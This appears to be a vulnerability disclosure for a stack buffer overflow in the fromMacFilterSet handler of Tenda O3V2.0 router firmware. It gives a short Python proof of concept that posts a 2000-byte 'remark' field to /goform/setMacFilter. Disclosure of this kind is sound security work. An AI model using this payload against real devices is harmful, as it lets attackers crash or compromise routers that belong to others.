## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2832.html

## Affected version

O3V2.0 V1.0.0.10(2478)

## Vulnerability details

In the O3V2.0 V1.0.0.10(2478) firmware has a stack overflow vulnerability in the `fromMacFilterSet` function. The `v25, v28` variable receives the `status, remark` parameter from a POST request. However, since the user can control the input of `status, remark`, the statement `sprintf` can cause a buffer overflow. The user-provided  `status, remark` can exceed the capacity of the `v75` array, triggering this security vulnerability.

![image-20240719003903758](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719003903758.png)

![image-20240719003804007](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719003804007.png)

![image-20240719003852096](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719003852096.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setMacFilter"
payload = b"a"*2000

data = {"mode": "3", "remark": payload}
response = requests.post(url, data=data)
```

![image-20240714213455164](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213455164.png)
